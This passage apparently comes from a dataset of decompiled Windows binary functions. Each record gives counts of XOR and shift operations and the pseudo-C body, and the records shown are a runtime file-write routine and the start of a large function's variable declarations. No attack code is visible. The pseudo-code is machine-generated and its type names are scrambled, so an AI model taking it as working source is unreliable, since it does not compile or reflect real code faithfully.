< 0x13FE );\n            v35 = v33 - Buffer;\n            v52 = v30;\n            v36 = WriteFile(*(HA3759 *)(v47 + dword_35099EF0[v53]), Buffer, v35, &v51, 0);\n            v20 = v55;\n            v4 = *(_DWORD *)WideCharStr;\n            if ( !v36 )\n              break;\n            v4 = v51 + *(_DWORD *)WideCharStr;\n            v22 = lpBuffer;\n            *(_DWORD *)WideCharStr += v51;\n            if ( (int)v51 >= v35 )\n            {\n              v29 = (char *)FileHandle;\n              if ( FileHandle - (int)lpBuffer < nNumberOfBytesToWrite )\n                continue;\n            }\n            goto LABEL_91;\n          }\n        }\n        else\n        {\n          NumberOfBytesWritten = (DWORD)lpBuffer;\n          while ( 1 )\n          {\n            Mode = 0;\n            v37 = (WCHAR *)NumberOfBytesWritten;\n            v38 = v29 - v22;\n            v39 = 0;\n            v40 = v61;\n            do\n            {\n              if ( v38 >= nNumberOfBytesToWrite )\n                break;\n              v41 = *v37++;\n              v38 += 2;\n              NumberOfBytesWritten = (DWORD)v37;\n              if ( v41 == 10 )\n              {\n                *v40 = 13;\n                v37 = (WCHAR *)NumberOfBytesWritten;\n                ++v40;\n                v39 += 2;\n              }\n              *v40 = v41;\n              v39 += 2;\n              ++v40;\n            }\n            while ( v39 < 0x6A8 );\n            v42 = (char *)WideCharToMultiByte(0xFDE9u, 0, v61, v40 - v61, v60, 3413, 0, 0);\n            v20 = v55;\n            v4 = *(_DWORD *)WideCharStr;\n            SrcCh = v42;\n            if ( !v42 )\n              break;\n            v43 = 0;\n            FileHandle = 0;\n            while ( WriteFile(*(HA3759 *)(v47 + dword_35099EF0[v53]), &v60[v43], (DWORD)&v42[-v43], &v51, 0) )\n            {\n              v43 = v51 + FileHandle;\n              v42 = SrcCh;\n              FileHandle = v43;\n              if ( (int)SrcCh <= v43 )\n                goto LABEL_84;\n            }\n            LastError = GetLastError();\n            v43 = FileHandle;\n            v20 = LastError;\n            v42 = SrcCh;\n            v55 = v20;\nLABEL_84:\n            if ( (int)v42 > v43 )\n              goto LABEL_90;\n            v29 = (char *)NumberOfBytesWritten;\n            v22 = lpBuffer;\n            v4 = NumberOfBytesWritten - (_DWORD)lpBuffer;\n            *(_DWORD *)WideCharStr = NumberOfBytesWritten - (_DWORD)lpBuffer;\n            if ( NumberOfBytesWritten - (unsigned int)lpBuffer >= nNumberOfBytesToWrite )\n              goto LABEL_91;\n          }\n        }\n      }\n      else\n      {\n        v23 = lpBuffer;\n        *(_DWORD *)WideCharStr = lpBuffer;\n        while ( 1 )\n        {\n          v24 = v23 - v22;\n          v25 = *(char **)WideCharStr;\n          v26 = Buffer;\n          FileHandle = 0;\n          do\n          {\n            if ( v24 >= nNumberOfBytesToWrite )\n              break;\n            ++v24;\n            v49 = *v25;\n            v27 = FileHandle;\n            *(_DWORD *)WideCharStr = v25 + 1;\n            if ( v49 == 10 )\n            {\n              ++v52;\n              *v26++ = 13;\n              ++v27;\n            }\n            *v26 = v49;\n            v25 = *(char **)WideCharStr;\n            ++v26;\n            FileHandle = v27 + 1;\n          }\n          while ( (unsigned int)(v27 + 1) < 0x13FF );\n          v28 = v26 - Buffer;\n          if ( !WriteFile(*(HA3759 *)(v47 + dword_35099EF0[v53]), Buffer, v28, &v51, 0) )\n            break;\n          v4 += v51;\n          v22 = lpBuffer;\n          if ( (int)v51 >= v28 )\n          {\n            v23 = *(_BYTE **)WideCharStr;\n            if ( *(_DWORD *)WideCharStr - (int)lpBuffer < nNumberOfBytesToWrite )\n              continue;\n          }\n          goto LABEL_91;\n        }\n      }\n    }\nLABEL_89:\n    v20 = GetLastError();\n    goto LABEL_90;\n  }\n  ConsoleCP = GetConsoleCP();\n  NumberOfBytesWritten = 0;\n  v11 = (char *)lpBuffer;\n  CodePage = ConsoleCP;\n  SrcCh = (char *)lpBuffer;\n  v12 = 0;\n  v55 = 0;\n  while ( v8 )\n  {\n    if ( v8 == 1 || v8 == 2 )\n    {\n      v18 = *(_WORD *)v11 == 10;\n      *(_DWORD *)WideCharStr = *(unsigned __int16 *)v11;\n      v11 += 2;\n      v12 = v55 + 2;\n      SrcCh = v11;\n      v55 += 2;\n      FileHandle = v18;\n    }\n    if ( v8 != 1 && v8 != 2 )\n      goto LABEL_45;\n    if ( _putwch_nolock(WideCharStr[0]) != WideCharStr[0] )\n      goto LABEL_89;\n    v4 += 2;\n    if ( FileHandle )\n    {\n      wcscpy(WideCharStr, L\"\\r\");\n      if ( _putwch_nolock(0xDu) != WideCharStr[0] )\n        goto LABEL_89;\n      ++v4;\n      ++v52;\n    }\nLABEL_44:\n    v12 = v55;\n    v11 = SrcCh;\nLABEL_45:\n    if ( v12 >= nNumberOfBytesToWrite )\n      goto LABEL_48;\n  }\n  v13 = *v11;\n  FileHandle = v13 == 10;\n  v14 = dword_35099EF0[v53];\n  if ( *(_DWORD *)(v6 + v14 + 56) )\n  {\n    MultiByteStr[0] = *(_BYTE *)(v6 + v14 + 52);\n    MultiByteStr[1] = v13;\n    *(_DWORD *)(v6 + v14 + 56) = 0;\n    v15 = mbtowc(WideCharStr, MultiByteStr, 2u);\nLABEL_26:\n    if ( v15 == -1 )\n      goto LABEL_48;\n    v16 = SrcCh;\nLABEL_28:\n    ++v55;\n    SrcCh = v16 + 1;\n    v17 = WideCharToMultiByte(CodePage, 0, WideCharStr, 1, MultiByteStr, 5, 0, 0);\n    Mode = v17;\n    if ( !v17 )\n      goto LABEL_48;\n    if ( !WriteFile(*(HA3759 *)(v6 + dword_35099EF0[v53]), MultiByteStr, v17, &NumberOfBytesWritten, 0) )\n      goto LABEL_89;\n    v4 = v52 + v55;\n    if ( (int)NumberOfBytesWritten < (int)Mode )\n      goto LABEL_48;\n    if ( FileHandle )\n    {\n      MultiByteStr[0] = 13;\n      if ( !WriteFile(*(HA3759 *)(v6 + dword_35099EF0[v53]), MultiByteStr, 1u, &NumberOfBytesWritten, 0) )\n        goto LABEL_89;\n      if ( (int)NumberOfBytesWritten < 1 )\n        goto LABEL_48;\n      ++v52;\n      ++v4;\n    }\n    goto LABEL_44;\n  }\n  if ( !isleadbyte(v13) )\n  {\n    v15 = mbtowc(WideCharStr, SrcCh, 1u);\n    goto LABEL_26;\n  }\n  if ( nNumberOfBytesToWrite + (_BYTE *)lpBuffer - SrcCh > 1 )\n  {\n    if ( mbtowc(WideCharStr, SrcCh, 2u) == -1 )\n      goto LABEL_48;\n    v16 = SrcCh + 1;\n    ++v55;\n    goto LABEL_28;\n  }\n  v19 = v53;\n  ++v4;\n  *(_BYTE *)(v6 + dword_35099EF0[v53] + 52) = *SrcCh;\n  *(_DWORD *)(v6 + dword_35099EF0[v19] + 56) = 1;\nLABEL_48:\n  v20 = FileHandle;\nLABEL_90:\n  v22 = lpBuffer;\nLABEL_91:\n  if ( v4 )\n    return v4 - v52;\n  if ( v20 )\n  {\n    if ( v20 == 5 )\n    {\n      *_errno() = 9;\n      *__doserrno() = 5;\n    }\n    else\n    {\n      _dosmaperr(v20);\n    }\n    return -1;\n  }\n  else\n  {\n    if ( (*(_BYTE *)(v47 + dword_35099EF0[v53] + 4) & 0x40) == 0 || *v22 != 26 )\n    {\n      *_errno() = 28;\n      *__doserrno() = 0;\n      return -1;\n    }\n    return 0;\n  }\n}\n// 35124FDF: conditional instruction was optimized away because %nNumberOfBytesToWrite.4!=0\n// 357568A7: conditional instruction was optimized away because %nNumberOfBytesToWrite.4!=0\n// 355CF891: conditional instruction was optimized away because %nNumberOfBytesToWrite.4!=0\n// 35B12D91: conditional instruction was optimized away because %nNumberOfBytesToWrite.4!=0\n// 3559E6C5: using guessed type _DWORD __cdecl _dosmaperr(_DWORD);\n// 352F6891: using guessed type int _getptd(void);\n// 35099EF0: using guessed type int dword_35099EF0[64];\n// 35258D66: using guessed type CHAR var_1410[3416];\n\n"
    },
    {
        "Function": "sub_35CAEB50",
        "Total XOR and shift operations": 5,
        "XOR operations": 2,
        "Shift operations": 3,
        "Operation percentage": "0.31%",
        "Function Body": "\nint __cdecl sub_35CAEB50(HM905FE hModule)\n{\n  double v1; // xmm0_8\n  float v2; // xmm0_4\n  double v3; // xmm0_8\n  float v4; // xmm0_4\n  float v5; // xmm0_4\n  float v6; // xmm0_4\n  double v7; // xmm0_8\n  float v8; // xmm0_4\n  float v9; // xmm0_4\n  float v10; // xmm0_4\n  float v11; // xmm1_4\n  float v12; // xmm0_4\n  double v13; // xmm0_8\n  int v14; // eax\n  HM905FE ModuleHandleA; // eax\n  LPCAE2 v16; // ecx\n  int DeviceCaps; // eax\n  HG184FJ v18; // eax\n  int v19; // eax\n  int v20; // eax\n  HWND DlgItem; // eax\n  HWND v22; // eax\n  HWND v23; // eax\n  signed int v24; // esi\n  signed int v25; // esi\n  int v27; // [esp-Ch] [ebp-24A8h]\n  int v28; // [esp-8h] [ebp-24A4h]\n  int v29; // [esp-4h] [ebp-24A0h]\n  UINT v30; // [esp-4h] [ebp-24A0h]\n  int fltIn; // [esp+0h] [ebp-249Ch]\n  WP0CFA fltIna; // [esp+0h] [ebp-249Ch]\n  LP3F5C fltIn_4; // [esp+4h] [ebp-2498h]\n  BOOL v34; // [esp+18h] [ebp-2484h]\n  __int32 v35; // [esp+18h] [ebp-2484h]\n  int v36; // [esp+1Ch] [ebp-2480h]\n  HDC v37; // [esp+24h] [ebp-2478h]\n  UINT v38; // [esp+2Ch] [ebp-2470h]\n  int nPos; // [esp+30h] [ebp-246Ch]\n  int nPosa; // [esp+30h] [ebp-246Ch]\n  int nLength; // [esp+34h] [ebp-2468h]\n  HWND v42; // [esp+38h] [ebp-2464h]\n  int v43; // [esp+3Ch] [ebp-2460h]\n  HM905FE v44; // [esp+48h] [ebp-2454h]\n  char v45; // [esp+4Fh] [ebp-244Dh] BYREF\n  int v46; // [esp+50h] [ebp-244Ch]\n  char v47; // [esp+57h] [ebp-2445h]\n  HWND v48; // [esp+58h] [ebp-2444h]\n  CHAR v49; // [esp+5Fh] [ebp-243Dh] BYREF\n  UINT v50; // [esp+60h] [ebp-243Ch]\n  int v51; // [esp+64h] [ebp-2438h]\n  char v52; // [esp+6Bh] [ebp-2431h] BYREF\n  unsigned int v53; // [esp+6Ch] [ebp-2430h]\n  char v54; // [esp+70h] [ebp-242Ch] BYREF\n  char v55; // [esp+71h] [ebp-242Bh] BYREF\n  char v56; // [esp+72h] [ebp-242Ah] BYREF\n  char v57; // [esp+73h] [ebp-2429h] BYREF\n  DWORD nLengthNeeded; // [esp+74h] [ebp-2428h] BYREF\n  char v59; // [esp+7Bh] [ebp-2421h] BYREF\n  int v60; // [esp+7Ch] [ebp-2420h]\n  char v61; // [esp+83h] [ebp-2419h] BYREF\n  int v62; // [esp+84h] [ebp-2418h]\n  char v63; // [esp+8Bh] [ebp-2411h] BYREF\n  int v64; // [esp+8Ch] [ebp-2410h]\n  int v65; // [esp+93h] [ebp-2409h] BYREF\n  char v66; // [esp+98h] [ebp-2404h]\n  char v67; // [esp+99h] [ebp-2403h]\n  int kk; // [esp+9Ch] [ebp-2400h]\n  DWORD v69; // [esp+A0h] [ebp-23FCh] BYREF\n  int v70; // [esp+A4h] [ebp-23F8h]\n  unsigned int v71; // [esp+A8h] [ebp-23F4h]\n  int v72; // [esp+ACh] [ebp-23F0h]\n  unsigned __int16 v73; // [esp+B2h] [ebp-23EAh]\n  int nBar; // [esp+B4h] [ebp-23E8h]\n  UINT v75; // [esp+B8h] [ebp-23E4h]\n  unsigned __int16 v76; // [esp+BEh] [ebp-23DEh]\n  unsigned int v77; // [esp+C0h] [ebp-23DCh]\n  unsigned __int16 v78; // [esp+C6h] [ebp-23D6h]\n  int v79; // [esp+C8h] [ebp-23D4h]\n  HWND v80; // [esp+CCh] [ebp-23D0h]\n  int n; // [esp+D0h] [ebp-23CCh]\n  unsigned __int16 v82; // [esp+D6h] [ebp-23C6h]\n  SQ805BR *p_szConnStrIn; // [esp+D8h] [ebp-23C4h]\n  unsigned __int16 v84; // [esp+DEh] [ebp-23BEh]\n  int jj; // [esp+E0h] [ebp-23BCh]\n  unsigned int v86; // [esp+E4h] [ebp-23B8h]\n  unsigned int v87; // [esp+E8h] [ebp-23B4h]\n  HWND hDlg; // [esp+ECh] [ebp-23B0h]\n  int ii; // [esp+F0h] [ebp-23ACh]\n  int v90; // [esp+F4h] [ebp-23A8h]\n  int (*v91)(void); // [esp+F8h] [ebp-23A4h]\n  HM905FE v92; // [esp+FCh] [ebp-23A0h]\n  UINT wDriverIndex; // [esp+100h] [ebp-239Ch]\n  int v94; // [esp+104h] [ebp-2398h]\n  int v95; // [esp+108h] [ebp-2394h]\n  int i; // [esp+10Ch] [ebp-2390h]\n  int v97; // [esp+110h] [ebp-238Ch]\n  LPCAE2 lpProcName; // [esp+114h] [ebp-2388h]\n  int *v99; // [esp+118h] [ebp-2384h] BYREF\n  int v100; // [esp+11Ch] [ebp-2380h]\n  HA3759 hFile; // [esp+120h] [ebp-237Ch]\n  bool v102; // [esp+127h] [ebp-2375h]\n  unsigned int v103; // [esp+128h] [ebp-2374h]\n  int v104; // [esp+12Ch] [ebp-2370h]\n  int v105; // [esp+130h] [ebp-236Ch]\n  int j; // [esp+134h] [ebp-2368h]\n  HWND v107; // [esp+138h] [ebp-2364h]\n  int v108; // [esp+13Ch] [ebp-2360h]\n  int v109; // [esp+140h] [ebp-235Ch]\n  HWND hWndParent; // [esp+144h] [ebp-2358h]\n  int v111; // [esp+148h] [ebp-2354h]\n  unsigned __int16 v112; // [esp+14Ch] [ebp-2350h]\n  int MinPos; // [esp+150h] [ebp-234Ch] BYREF\n  int v114; // [esp+154h] [ebp-2348h]\n  int MaxPos; // [esp+158h] [ebp-2344h] BYREF\n  int m; // [esp+15Ch] [ebp-2340h]\n  int v117; // [esp+160h] [ebp-233Ch]\n  WCHAR pwcsName; // [esp+164h] [ebp-2338h] BYREF\n  int v119; // [esp+168h] [ebp-2334h]\n  HRSRC hResInfo; // [esp+16Ch] [ebp-2330h]\n  __int16 v121; // [esp+172h] [ebp-232Ah]\n  int k; // [esp+174h] [ebp-2328h]\n  __int16 v123; // [esp+17Ah] [ebp-2322h]\n  void *v124[2]; // [esp+17Ch] [ebp-2320h] BYREF\n  __int64 lParam; // [esp+184h] [ebp-2318h]\n  __int64 wParam; // [esp+18Ch] [ebp-2310h]\n  struct tagPOINT Point; // [esp+194h] [ebp-2308h] BYREF\n  struct tagPOINT v128; // [esp+19Ch] [ebp-2300h] BYREF\n  struct tagPOINT v129; // [esp+1A4h] [ebp-22F8h] BYREF\n  struct tagPOINT v130; // [esp+1ACh] [ebp-22F0h] BYREF\n  BOOL v131; // [esp+1B4h] [ebp-22E8h]\n  DWORD v132; // [esp+1B8h] [ebp-22E4h]\n  int v133; // [esp+1BCh] [ebp-22E0h]\n  int v134; // [esp+1C0h] [ebp-22DCh]\n  int v135; // [esp+1C4h] [ebp-22D8h]\n  BOOL v136; // [esp+1C8h] [ebp-22D4h]\n  DWORD v137; // [esp+1CCh] [ebp-22D0h]\n  HDC hDC; // [esp+1D0h] [ebp-22CCh]\n  DWORD v139; // [esp+1D4h] [ebp-22C8h]\n  LP3F5C v140; // [esp+1D8h] [ebp-22C4h]\n  unsigned __int32 v141; // [esp+1DCh] [ebp-22C0h]\n  WP0CFA v142; // [esp+1E0h] [ebp-22BCh]\n  int FileSecurityA; // [esp+1E4h] [ebp-22B8h]\n  int v144; // [esp+1E8h] [ebp-22B4h]\n  int v145; // [esp+1ECh] [ebp-22B0h]\n  int v146; // [esp+1F0h] [ebp-22ACh]\n  int v147; // [esp+1F4h] [ebp-22A8h]\n  HWND v148; // [esp+1F8h] [ebp-22A4h]\n  LPCAE2 lpLibFileName; // [esp+1FCh] [ebp-22A0h]\n  int v150; // [esp+200h] [ebp-229Ch]\n  int v151; // [esp+204h] [ebp-2298h]\n  unsigned int v152; // [esp+208h] [ebp-2294h]\n  int v153; // [esp+20Ch] [ebp-2290h]\n  int v154; // [esp+210h] [ebp-228Ch]\n  BOOL v155; // [esp+214h] [ebp-2288h]\n  int v156; // [esp+218h] [ebp-2284h]\n  int v157; // [esp+21Ch] [ebp-2280h]\n  int KernelObjectSecurity; // [esp+220h] [ebp-227Ch]\n  __int64 v159; // [esp+224h] [ebp-2278h]\n  unsigned int v160; // [esp+22Ch] [ebp-2270h]\n  unsigned int v161; // [esp+230h] [ebp-226Ch]\n  int v162; // [esp+234h] [ebp-2268h]\n  unsigned int v163; // [esp+238h] [ebp-2264h]\n  HDC hdc; // [esp+23Ch] [ebp-2260h]\n  int v165; // [esp+240h] [ebp-225Ch]\n  ULONG_PTR NumberOfPages; // [esp+244h] [ebp-2258h]\n  DWORD v167; // [esp+248h] [ebp-2254h]\n  UINT v168; // [esp+24Ch] [ebp-2250h]\n  int v169; // [esp+250h] [ebp-224Ch]\n  int v170; // [esp+254h] [ebp-2248h]\n  DWORD v171; // [esp+258h] [ebp-2244h]\n  int v172; // [esp+25Ch] [ebp-2240h]\n  int v173; // [esp+260h] [ebp-223Ch]\n  __int64 v174; // [esp+264h] [ebp-2238h]\n  __int64 Msg; // [esp+26Ch] [ebp-2230h]\n  int v176[3]; // [esp+274h] [ebp-2228h] BYREF\n  HG024BL hResData; // [esp+280h] [ebp-221Ch]\n  int v178; // [esp+284h] [ebp-2218h]\n  HC3994PROV phProv[2]; // [esp+288h] [ebp-2214h] BYREF\n  int v180; // [esp+290h] [ebp-220Ch]\n  int v181; // [esp+294h] [ebp-2208h] BYREF\n  DWORD FileAttributesW; // [esp+298h] [ebp-2204h]\n  DWORD dwProcessId; // [esp+29Ch] [ebp-2200h] BYREF\n  LP3F5C v184; // [esp+2A0h] [ebp-21FCh]\n  LPCAE2 pvIn; // [esp+2A4h] [ebp-21F8h]\n  WP0CFA v186; // [esp+2A8h] [ebp-21F4h]\n  int v187; // [esp+2ACh] [ebp-21F0h]\n  UINT v188; // [esp+2B0h] [ebp-21ECh]\n  int v189; // [esp+2B4h] [ebp-21E8h]\n  DWORD v190; // [esp+2B8h] [ebp-21E4h]\n  float v191; // [esp+2BCh] [ebp-21E0h]\n  HDC v192; // [esp+2C0h] [ebp-21DCh]\n  float v193; // [esp+2C4h] [ebp-21D8h]\n  DWORD v194; // [esp+2C8h] [ebp-21D4h]\n  float v195; // [esp+2CCh] [ebp-21D0h]\n  UINT v196; // [esp+2D0h] [ebp-21CCh]\n  float v197; // [esp+2D4h] [ebp-21C8h]\n  UINT uID; // [esp+2D8h] [ebp-21C4h]\n  float v199; // [esp+2DCh] [ebp-21C0h]\n  unsigned int v200; // [esp+2E0h] [ebp-21BCh] BYREF\n  unsigned __int8 *v201; // [esp+2E4h] [ebp-21B8h]\n  HM905FE v202; // [esp+2E8h] [ebp-21B4h]\n  float v203; // [esp+2ECh] [ebp-21B0h]\n  HWND v204; // [esp+2F0h] [ebp-21ACh] BYREF\n  LPCB95AM ppstm; // [esp+2F4h] [ebp-21A8h] BYREF\n  int v206; // [esp+2F8h] [ebp-21A4h]\n  int v209[2]; // [esp+304h] [ebp-2198h] BYREF\n  int pvTypePara[4]; // [esp+30Ch] [ebp-2190h] BYREF\n  BOOL v211; // [esp+31Ch] [ebp-2180h]\n  HA3759 EventA; // [esp+320h] [ebp-217Ch]\n  LPCAE2 lpName; // [esp+324h] [ebp-2178h]\n  int **v214; // [esp+328h] [ebp-2174h]\n  int v215; // [esp+32Ch] [ebp-2170h]\n  int v216; // [esp+330h] [ebp-216Ch]\n  HM905FE LibraryA; // [esp+334h] [ebp-2168h]\n  float v218; // [esp+338h] [ebp-2164h]\n  LPB244D lpBuffer; // [esp+33Ch] [ebp-2160h]\n  float v220; // [esp+340h] [ebp-215Ch]\n  int v221; // [esp+344h] [ebp-2158h]\n  int v222; // [esp+348h] [ebp-2154h]\n  int v223; // [esp+34Ch] [ebp-2150h]\n  char *v224; // [esp+350h] [ebp-214Ch]\n  unsigned __int8 *v225; // [esp+354h] [ebp-2148h]\n  HWND v226; // [esp+358h] [ebp-2144h]\n  int v227; // [esp+35Ch] [ebp-2140h]\n  HWND hWnd; // [esp+360h] [ebp-213Ch]\n  SQ27A6LLINT pcchConnStrOut[2]; // [esp+364h] [ebp-2138h] BYREF\n  int v230; // [esp+368h] [ebp-2134h]\n  int v231; // [esp+36Ch] [ebp-2130h]\n  float v232; // [esp+370h] [ebp-212Ch]\n  SQE25CC hdbc; // [esp+374h] [ebp-2128h]\n  float v234; // [esp+378h] [ebp-2124h]\n  PU1183_PTR v235; // [esp+37Ch] [ebp-2120h]\n  int v236; // [esp+380h] [ebp-211Ch]\n  PU1183_PTR PageArray; // [esp+384h] [ebp-2118h]\n  int v238; // [esp+388h] [ebp-2114h]\n  PVOID VirtualAddress; // [esp+38Ch] [ebp-2110h]\n  HM905FE v240; // [esp+390h] [ebp-210Ch]\n  __int16 v241; // [esp+394h] [ebp-2108h]\n  int v242; // [esp+398h] [ebp-2104h]\n  PC214C_CO13CAT pCertContext; // [esp+39Ch] [ebp-2100h]\n  int v244; // [esp+3A0h] [ebp-20FCh]\n  DWORD v245; // [esp+3A4h] [ebp-20F8h]\n  LPCAE2 lpType; // [esp+3A8h] [ebp-20F4h]\n  unsigned __int64 v247; // [esp+3ACh] [ebp-20F0h]\n  LPCAE2 lpFileName; // [esp+3B8h] [ebp-20E4h]\n  __int64 v249; // [esp+3BCh] [ebp-20E0h]\n  FA9A7CC ProcAddress; // [esp+3C8h] [ebp-20D4h]\n  unsigned __int64 v251; // [esp+3CCh] [ebp-20D0h]\n  LP83F0 bufptr; // [esp+3D8h] [ebp-20C4h] BYREF\n  LR66E7T v253; // [esp+3DCh] [ebp-20C0h]\n  float v254; // [esp+3E0h] [ebp-20BCh]\n  int v255; // [esp+3E4h] [ebp-20B8h]\n  float v256; // [esp+3E8h] [ebp-20B4h]\n  DWORD nNumberOfBytesToWrite; // [esp+3ECh] [ebp-20B0h]\n  PCtxtHandle phContext; // [esp+3F0h] [ebp-20ACh]\n  HWND v259; // [esp+3F4h] [ebp-20A8h]\n  int v260; // [esp+3F8h] [ebp-20A4h]\n  PAD3C9REAM pavi; // [esp+3FCh] [ebp-20A0h]\n  HA3759 hHandle; // [esp+400h] [ebp-209Ch]\n  __int64 v263; // [esp+404h] [ebp-2098h]\n  int v264; // [esp+410h] [ebp-208Ch] BYREF\n  __int64 v265; // [esp+414h] [ebp-2088h]\n  void *v266[5]; // [esp+41Ch] [ebp-2080h] BYREF\n  void *v267[5]; // [esp+430h] [ebp-206Ch] BYREF\n  int v268; // [esp+444h] [ebp-2058h]\n  int v269; // [esp+448h] [ebp-2054h]\n  struct tagSIZE psizl; // [esp+44Ch] [ebp-2050h] BYREF\n  int v271[2]; // [esp+454h] [ebp-2048h] BYREF\n  struct tagPOINT Points; // [esp+45Ch] [ebp-2040h] BYREF\n  int v273[2]; // [esp+464h] [ebp-2038h] BYREF\n  DO841C pdblOut; // [esp+46Ch] [ebp-2030h] BYREF\n  int pMesh[2]; // [esp+474h] [ebp-2028h] BYREF\n  __int16 v276; // [esp+47Ch] [ebp-2020h] BYREF\n  int v277; // [esp+480h] [ebp-201Ch]\n  void *v278[5]; // [esp+484h] [ebp-2018h] BYREF\n  void *v279[4]; // [esp+498h] [ebp-2004h] BYREF\n  int v280; // [esp+4A8h] [ebp-1FF4h]\n  int v281[6]; // [esp+4ACh] [ebp-1FF0h] BYREF\n  double v282; // [esp+4C4h] [ebp-1FD8h]\n  HWND v283; // [esp+4D0h] [ebp-1FCCh]\n  double v284; // [esp+4D4h] [ebp-1FC8h]\n  int v285; // [esp+4E0h] [ebp-1FBCh]\n  double v286; // [esp+4E4h] [ebp-1FB8h]\n  SE_OBC9F9_TYPE v287; // [esp+4F0h] [ebp-1FACh]\n  __int64 v288; // [esp+4F4h] [ebp-1FA8h]\n  int v289; // [esp+500h] [ebp-1F9Ch]\n  double v290; // [esp+504h] [ebp-1F98h]\n  HWND v291[2]; // [esp+50Ch] [ebp-1F90h]\n  double v292; // [esp+514h] [ebp-1F88h]\n  int v293; // [esp+520h] [ebp-1F7Ch]\n  double v294; // [esp+524h] [ebp-1F78h]\n  __int64 v295; // [esp+52Ch] [ebp-1F70h]\n  HDC WindowDC; // [esp+538h] [ebp-1F64h]\n  double v297; // [esp+53Ch] [ebp-1F60h]\n  va_list ArgList; // [esp+548h] [ebp-1F54h]\n  double v299; // [esp+54Ch] [ebp-1F50h]\n  IStorage *ppstgOpen; // [esp+558h] [ebp-1F44h] BYREF\n  __int64 v301; // [esp+55Ch] [ebp-1F40h]\n  int *v302; // [esp+568h] [ebp-1F34h]\n  double v303; // [esp+56Ch] [ebp-1F30h]\n  int v304; // [esp+578h] [ebp-1F24h]\n  double v305; // [esp+57Ch] [ebp-1F20h]\n  IShellFolder *ppshf; // [esp+588h] [ebp-1F14h] BYREF\n  double v307; // [esp+58Ch] [ebp-1F10h]\n  int v308; // [esp+598h] [ebp-1F04h]\n  double v309; // [esp+59Ch] [ebp-1F00h]\n  int v310; // [esp+5A8h] [ebp-1EF4h]\n  double v311; // [esp+5ACh] [ebp-1EF0h]\n  int *v312; // [esp+5B8h] [ebp-1EE4h]\n  double v313; // [esp+5BCh] [ebp-1EE0h]\n  DWORD NumberOfBytesWritten; // [esp+5C8h] [ebp-1ED4h] BYREF\n  double v315; // [esp+5CCh] [ebp-1ED0h]\n  int v316; // [esp+5D8h] [ebp-1EC4h]\n  double v317; // [esp+5DCh] [ebp-1EC0h]\n  int v318; // [esp+5E8h] [ebp-1EB4h]\n  __int64 v319; // [esp+5ECh] [ebp-1EB0h]\n  HIE2CANET v320; // [esp+5F8h] [ebp-1EA4h]\n  double v321; // [esp+5FCh] [ebp-1EA0h]\n  int v322; // [esp+608h] [ebp-1E94h]\n  double v323; // [esp+60Ch] [ebp-1E90h]\n  DWORD v324; // [esp+618h] [ebp-1E84h]\n  double v325; // [esp+61Ch] [ebp-1E80h]\n  HIE2CANET v326; // [esp+624h] [ebp-1E78h]\n  int v327; // [esp+628h] [ebp-1E74h]\n  int v328; // [esp+62Ch] [ebp-1E70h]\n  int v329; // [esp+630h] [ebp-1E6Ch]\n  int v330; // [esp+634h] [ebp-1E68h]\n  int v331; // [esp+638h] [ebp-1E64h]\n  int v332; // [esp+63Ch] [ebp-1E60h]\n  int v333; // [esp+640h] [ebp-1E5Ch]\n  __int64 v334; // [esp+644h] [ebp-1E58h]\n  int v335; // [esp+650h] [ebp-1E4Ch]\n  double v336; // [esp+654h] [ebp-1E48h]\n  int v337; // [esp+660h] [ebp-1E3Ch]\n  double v338; // [esp+664h] [ebp-1E38h]\n  int v339; // [esp+66Ch] [ebp-1E30h]\n  UINT v340; // [esp+670h] [ebp-1E2Ch]\n  int v341; // [esp+674h] [ebp-1E28h]\n  int v342; // [esp+678h] [ebp-1E24h]\n  int v343; // [esp+67Ch] [ebp-1E20h]\n  int v344; // [esp+680h] [ebp-1E1Ch]\n  int v345; // [esp+684h] [ebp-1E18h]\n  DWORD v346; // [esp+688h] [ebp-1E14h]\n  HIE2CANET v347; // [esp+68Ch] [ebp-1E10h]\n  int v348; // [esp+690h] [ebp-1E0Ch]\n  int v349; // [esp+694h] [ebp-1E08h]\n  int v350; // [esp+698h] [ebp-1E04h]\n  int v351; // [esp+69Ch] [ebp-1E00h]\n  int v352[11]; // [esp+6A0h] [ebp-1DFCh] BYREF\n  double v353; // [esp+6CCh] [ebp-1DD0h]\n  int v354; // [esp+6D4h] [ebp-1DC8h]\n  char v355[8]; // [esp+6D8h] [ebp-1DC4h] BYREF\n  char pBuffer[8]; // [esp+6E0h] [ebp-1DBCh] BYREF\n  struct _SecHandle v357; // [esp+6E8h] [ebp-1DB4h] BYREF\n  char v358[8]; // [esp+6F0h] [ebp-1DACh] BYREF\n  char v359[12]; // [esp+6F8h] [ebp-1DA4h] BYREF\n  int v360; // [esp+704h] [ebp-1D98h]\n  int v361[3]; // [esp+708h] [ebp-1D94h] BYREF\n  int v362[3]; // [esp+714h] [ebp-1D88h] BYREF\n  char v363; // [esp+720h] [ebp-1D7Ch] BYREF\n  LP3F5C v364[7]; // [esp+734h] [ebp-1D68h] BYREF\n  unsigned int v365; // [esp+750h] [ebp-1D4Ch]\n  int v366; // [esp+774h] [ebp-1D28h]\n  int v367; // [esp+778h] [ebp-1D24h]\n  int v368; // [esp+77Ch] [ebp-1D20h]\n  HIE2CANET v369; // [esp+780h] [ebp-1D1Ch]\n  int v370; // [esp+78Ch] [ebp-1D10h]\n  int v371; // [esp+790h] [ebp-1D0Ch]\n  int v372; // [esp+794h] [ebp-1D08h]\n  int v373; // [esp+798h] [ebp-1D04h]\n  int v374; // [esp+79Ch] [ebp-1D00h]\n  int v375; // [esp+7A0h] [ebp-1CFCh]\n  int v376; // [esp+7A4h] [ebp-1CF8h]\n  int v377; // [esp+7A8h] [ebp-1CF4h]\n  int v378; // [esp+7ACh] [ebp-1CF0h]\n  int v379; // [esp+7B0h] [ebp-1CECh]\n  int v380; // [esp+7B4h] [ebp-1CE8h]\n  int v381; // [esp+7B8h] [ebp-1CE4h]\n  int v382; // [esp+7BCh] [ebp-1CE0h]\n  int v383; // [esp+7C0h] [ebp-1CDCh]\n  int v384; // [esp+7C4h] [ebp-1CD8h]\n  int v385; // [esp+7C8h] [ebp-1CD4h]\n  int v386; // [esp+7CCh] [ebp-1CD0h]\n  int v387; // [esp+7D0h] [ebp-1CCCh]\n  int v388; // [esp+7D4h] [ebp-1CC8h]\n  DWORD v389; // [esp+7D8h] [ebp-1CC4h]\n  int v390; // [esp+7DCh] [ebp-1CC0h]\n  unsigned __int32 v391; // [esp+7E0h] [ebp-1CBCh]\n  int v392; // [esp+7E4h] [ebp-1CB8h]\n  int v393; // [esp+7E8h] [ebp-1CB4h]\n  int v394; // [esp+7ECh] 